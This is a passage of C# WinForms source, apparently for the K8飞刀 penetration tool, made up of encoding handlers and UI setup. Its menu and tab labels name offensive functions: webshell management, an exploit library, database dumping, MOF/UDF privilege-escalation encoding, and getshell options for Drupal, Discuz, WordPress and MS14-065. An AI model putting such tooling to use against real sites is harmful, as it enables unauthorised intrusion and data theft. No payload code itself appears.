                Clipboard.SetDataObject(K8crack.Hex2String(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hex解码UnicodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("此功能未完成!");
        }

        private void hex解码UTF8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("此功能未完成!");
        }

        private void hEX文件路径1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8Path16_MSSQL(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hEX文件路径2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8Path16_Mysql(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hTML实体DecToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8HTMLCharacter10(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hTML实体HexToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8HTMLCharacter16(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hTML实体UTF8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("此功能未完成!");
        }

        private void icoBtn_about_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_Introduction");
            this.icoBtn_about.Focus();
        }

        private void icoBtn_about_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_about, "Update History\r\nK8飞刀更新历史");
        }

        private void icoBtn_CmdShell_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_CmdShell");
        }

        private void icoBtn_CmdShell_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_CmdShell, "CmdShell\r\n虚拟终端");
        }

        private void icoBtn_CookieBrowser_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_CookieBrowser");
        }

        private void icoBtn_CookieBrowser_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_CookieBrowser, "CookieBrowser\r\nCookie浏览器");
        }

        private void icoBtn_dataOutput_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_DataOutput");
        }

        private void icoBtn_dataOutput_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_dataOutput, "DataOutput\r\n脱库||抓取数据||Fuzzing");
        }

        private void icoBtn_encodeDecode_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_EncodeDecode");
        }

        private void icoBtn_encodeDecode_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_encodeDecode, "EncodeDecode\r\n渗透常用编码转换");
        }

        private void icoBtn_ExpDebug_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_SubmitTest");
        }

        private void icoBtn_ExpDebug_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_ExpDebug, "ExpDebug\r\nEXP调式");
        }

        private void icoBtn_EXploitDB_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_ExploitManage");
        }

        private void icoBtn_EXploitDB_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_EXploitDB, "Exploit-DB\r\n漏洞利用库");
        }

        private void icoBtn_MouseDown(object sender, EventArgs e)
        {
            Button button = sender as Button;
            Image image = new Bitmap(@"K8skin\btn_Normal.png");
            button.BackgroundImage = image;
        }

        private void icoBtn_MouseHover(object sender, EventArgs e)
        {
            Button button = sender as Button;
            Image image = new Bitmap(@"K8skin\btn_Move.png");
            button.BackgroundImage = image;
        }

        private void icoBtn_MouseLeave(object sender, EventArgs e)
        {
            Button button = sender as Button;
            Image image = new Bitmap(@"K8skin\btn_Normal.png");
            button.BackgroundImage = image;
        }

        private void icoBtn_MouseMove(object sender, EventArgs e)
        {
            Button button = sender as Button;
            Image image = new Bitmap(@"K8skin\btn_Move.png");
            button.BackgroundImage = image;
        }

        private void icoBtn_MouseUp(object sender, EventArgs e)
        {
            Button button = sender as Button;
            Image image = new Bitmap(@"K8skin\btn_Normal.png");
            button.BackgroundImage = image;
        }

        private void icoBtn_ScanAdmin_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_ScanAdmin");
        }

        private void icoBtn_ScanAdmin_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_ScanAdmin, "ScanAdmin\r\n极速后台扫描");
        }

        private void icoBtn_WebShell_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_ShellManage");
        }

        private void icoBtn_WebShell_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_WebShell, "WebShell Manage\r\nWebShell管理");
        }

        private void icoBtn_XssAnalysis_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_XssAnalysis");
        }

        private void icoBtn_XssAnalysis_MouseHover(object sender, EventArgs e)
        {
            new ToolTip { ShowAlways = true }.SetToolTip(this.icoBtn_XssAnalysis, "XssAnalysis\r\nXSS挂马流量分析系统");
        }

        private void icoButton_cmdShell_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_CmdShell");
        }

        public string IniReadValue(string Section, string Key, string filepath)
        {
            int capacity = 0x800000;
            StringBuilder retVal = new StringBuilder(capacity);
            int num2 = GetPrivateProfileString(Section, Key, "", retVal, capacity, filepath);
            return retVal.ToString();
        }

        public string IniReadValue(string Section, string Key, string filepath, string defaultValue)
        {
            int capacity = 0x800000;
            StringBuilder retVal = new StringBuilder(capacity);
            int num2 = GetPrivateProfileString(Section, Key, "", retVal, capacity, filepath);
            if (retVal.ToString().Trim() != "")
            {
                return retVal.ToString();
            }
            return defaultValue;
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMain));
            this.tab_MainForm = new System.Windows.Forms.TabControl();
            this.tab_ShellManage = new System.Windows.Forms.TabPage();
            this.lv_webShell = new System.Windows.Forms.ListView();
            this.rm_ShellMgr = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripSeparator();
            this.添加ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.修改ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.删除ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.批量删除ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripSeparator();
            this.用浏览器打开ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.用Firefox打开ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.用Chrome打开ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.用微软IE打开ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripSeparator();
            this.cookie浏览器ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.文件管理ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.虚拟CMD终端ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripSeparator();
            this.列表排序ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.脚本分类ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.地区分类ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.系统分类ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripSeparator();
            this.rP值大小ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.检查是否在控ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.检测当前WebShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.检测选中WebShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.检测所有WebShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripSeparator();
            this.检测网站存活ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripSeparator();
            this.合并数据库ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.导入飞刀数据ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.导入菜刀数据ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripSeparator();
            this.tab_SubmitTest = new System.Windows.Forms.TabPage();
            this.txt_addURL = new System.Windows.Forms.TextBox();
            this.txt_TimeOut = new System.Windows.Forms.TextBox();
            this.cbb_expDebugCoding = new System.Windows.Forms.ComboBox();
            this.txt_UserAgent = new System.Windows.Forms.TextBox();
            this.web_expDebugResult = new System.Windows.Forms.WebBrowser();
            this.txt_SubmitData = new System.Windows.Forms.TextBox();
            this.txt_RefererURL = new System.Windows.Forms.TextBox();
            this.txt_submitCookies = new System.Windows.Forms.TextBox();
            this.rb_none = new System.Windows.Forms.RadioButton();
            this.rb_PostMethod = new System.Windows.Forms.RadioButton();
            this.rb_GetMethod = new System.Windows.Forms.RadioButton();
            this.txt_k8url = new System.Windows.Forms.TextBox();
            this.chk_submitCookies = new System.Windows.Forms.CheckBox();
            this.Cbb_UserAgent = new System.Windows.Forms.ComboBox();
            this.pictureBox12 = new System.Windows.Forms.PictureBox();
            this.label5 = new System.Windows.Forms.Label();
            this.pictureBox11 = new System.Windows.Forms.PictureBox();
            this.label15 = new System.Windows.Forms.Label();
            this.pictureBox10 = new System.Windows.Forms.PictureBox();
            this.label4 = new System.Windows.Forms.Label();
            this.pictureBox9 = new System.Windows.Forms.PictureBox();
            this.pictureBox8 = new System.Windows.Forms.PictureBox();
            this.label32 = new System.Windows.Forms.Label();
            this.pictureBox7 = new System.Windows.Forms.PictureBox();
            this.pictureBox6 = new System.Windows.Forms.PictureBox();
            this.pictureBox5 = new System.Windows.Forms.PictureBox();
            this.pictureBox4 = new System.Windows.Forms.PictureBox();
            this.pictureBox3 = new System.Windows.Forms.PictureBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.pic_server = new System.Windows.Forms.PictureBox();
            this.lbl_expDebugInfo = new System.Windows.Forms.Label();
            this.rm_CopyDebugInfo = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.全部复制ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem62 = new System.Windows.Forms.ToolStripSeparator();
            this.只复制IPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.复制地理位置ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.复制BannerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Btn_Submit = new System.Windows.Forms.Button();
            this.btn_AddUpdateExp = new System.Windows.Forms.Button();
            this.label16 = new System.Windows.Forms.Label();
            this.chk_allowRedirect = new System.Windows.Forms.CheckBox();
            this.chk_Result_WebBrowser = new System.Windows.Forms.CheckBox();
            this.label3 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.chk_ResultText = new System.Windows.Forms.CheckBox();
            this.label1 = new System.Windows.Forms.Label();
            this.txt_Result = new System.Windows.Forms.TextBox();
            this.tab_EncodeDecode = new System.Windows.Forms.TabPage();
            this.lbl_OriginalLen = new System.Windows.Forms.Label();
            this.txt_EncodeDecodeText = new System.Windows.Forms.TextBox();
            this.rm_encodeDecode = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.新建ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.保存ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.打开ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem39 = new System.Windows.Forms.ToolStripSeparator();
            this.encodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem52 = new System.Windows.Forms.ToolStripSeparator();
            this.mD5SHA1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem43 = new System.Windows.Forms.ToolStripSeparator();
            this.mD5加密16位ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mD5加密32位ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem12 = new System.Windows.Forms.ToolStripSeparator();
            this.sHA1加密40位ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sHA256加密ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sHA384加密ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sHA512加密ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem32 = new System.Windows.Forms.ToolStripSeparator();
            this.全部加密结果ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem44 = new System.Windows.Forms.ToolStripSeparator();
            this.k8Md5CodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.base64encodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem42 = new System.Windows.Forms.ToolStripSeparator();
            this.base64GB2312ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.base64UTF8ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.base64Unicode编码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.以上算法全使用ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem13 = new System.Windows.Forms.ToolStripSeparator();
            this.base64GB2312解码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.base64UTF8解码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.base64Unicode解码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem41 = new System.Windows.Forms.ToolStripSeparator();
            this.uRLencodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem40 = new System.Windows.Forms.ToolStripSeparator();
            this.uRL编码全部ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uRL编码GBKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uRL编码UTF8ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uRL编码UnicodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.以上算法全用ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem14 = new System.Windows.Forms.ToolStripSeparator();
            this.uRL解码GBKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uRL解码GBKToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.uRL解码GBKToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem35 = new System.Windows.Forms.ToolStripSeparator();
            this.只有空格20ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.只有20空格ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.只有空格URL编码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.只有加号空格ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem49 = new System.Windows.Forms.ToolStripSeparator();
            this.hex编码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem55 = new System.Windows.Forms.ToolStripSeparator();
            this.hex编码ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.hex编码UTF8ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hex编码UnicodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.以上算法全使用ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem54 = new System.Windows.Forms.ToolStripSeparator();
            this.hex解码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hex解码UTF8ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hex解码UnicodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem53 = new System.Windows.Forms.ToolStripSeparator();
            this.aSCII码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem38 = new System.Windows.Forms.ToolStripSeparator();
            this.string2AsciiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aSCII码转字符串ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aSCII码之和ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem37 = new System.Windows.Forms.ToolStripSeparator();
            this.转成PHPCHR字符串点号ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pHPCHR字符串ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pHPCHR字符串反转ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sQLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem36 = new System.Windows.Forms.ToolStripSeparator();
            this.oracleCHRToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mSSQLCHARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mYSQLCHARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mYSQLCHAR2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.以上算法全使用ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem16 = new System.Windows.Forms.ToolStripSeparator();
            this.oracleCHRDecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mSSQLCHARDecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mysqlCHAR1DecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mysqlCHAR2DecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem15 = new System.Windows.Forms.ToolStripSeparator();
            this.mOF提权HexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uDF提权HexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mOF提权CHRToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uDF提权CHRToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem27 = new System.Windows.Forms.ToolStripSeparator();
            this.hEX文件路径1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hEX文件路径2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem26 = new System.Windows.Forms.ToolStripSeparator();
            this.xSSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem45 = new System.Windows.Forms.ToolStripSeparator();
            this.fromCharCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hTML实体DecToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hTML实体HexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hTML实体UTF8ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.以上算法全使用ToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem30 = new System.Windows.Forms.ToolStripSeparator();
            this.jSHexStringToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jSUnicodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jSEscapeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jSEscapeALLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.以上算法全使用ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem31 = new System.Windows.Forms.ToolStripSeparator();
            this.中文UnicodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.unicode中文ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem46 = new System.Windows.Forms.ToolStripSeparator();
            this.http提交ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.提交代码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jQueryPost代码post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.flashAS脚本Post提交post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pythonPost提交代码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pHPPost提交代码post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.perlPost提交代码post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.正转ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jQueryPost代码post参数ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.post参数FlashPost参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.post参数PythonPost参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.post参数PHPPost参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.反转ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.post参数JQueryPost参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jQueryPost参数Post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pythonPost参数Post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pHPPost参数Post参数ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem63 = new System.Windows.Forms.ToolStripSeparator();
            this.binFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem47 = new System.Windows.Forms.ToolStripSeparator();
            this.fileHexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileASCIIToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem48 = new System.Windows.Forms.ToolStripSeparator();
            this.coderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem34 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
            this.空格ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.空格JSP代码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem29 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripMenuItem17 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem23 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem24 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem25 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem33 = new System.Windows.Forms.ToolStripSeparator();
            this.转成一行ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.转成一行rnToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成多行号结尾ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.c转成StringBuilder代码正常ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.c转成StringBuilder代码rnToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem50 = new System.Windows.Forms.ToolStripSeparator();
            this.进制转换ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.bat批处理ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem60 = new System.Windows.Forms.ToolStripSeparator();
            this.bat逻辑命令符说明ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem59 = new System.Windows.Forms.ToolStripSeparator();
            this.转成一行2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成一行1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成一行1ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.转成一行2ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.每行前面不带注释ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.不转行前ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem57 = new System.Windows.Forms.ToolStripSeparator();
            this.转成多行2ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成多行1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成多行2ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.转成多行1ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.去掉行首ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.去掉注释ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.去掉行首去掉注释ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem58 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripMenuItem61 = new System.Windows.Forms.ToolStripSeparator();
            this.getShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.discuz6x7x代码执行漏洞ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.day网马ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mS14065ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem64 = new System.Windows.Forms.ToolStripSeparator();
            this.浏览器ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.用Firefox打开ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.用Chrome打开ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.用微软IE打开ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem28 = new System.Windows.Forms.ToolStripSeparator();
            this.剪切ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.复制ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.粘贴ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.删除ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.全选ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripSeparator();
            this.转成大写ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成小写ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成半角ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成全角ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.转成一行ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem11 = new System.Windows.Forms.ToolStripSeparator();
            this.txt_ms14065 = new System.Windows.Forms.TextBox();
            this.tab_CookieBrowser = new System.Windows.Forms.TabPage();
            this.txt_getHttponlyCookie = new System.Windows.Forms.TextBox();
            this.txt_getCookies = new System.Windows.Forms.TextBox();
            this.btn_setHttponlyCookie = new System.Windows.Forms.Button();
            this.btn_UpdateCookies = new System.Windows.Forms.Button();
            this.btn_navigateURL = new System.Windows.Forms.Button();
            this.label8 = new System.Windows.Forms.Label();
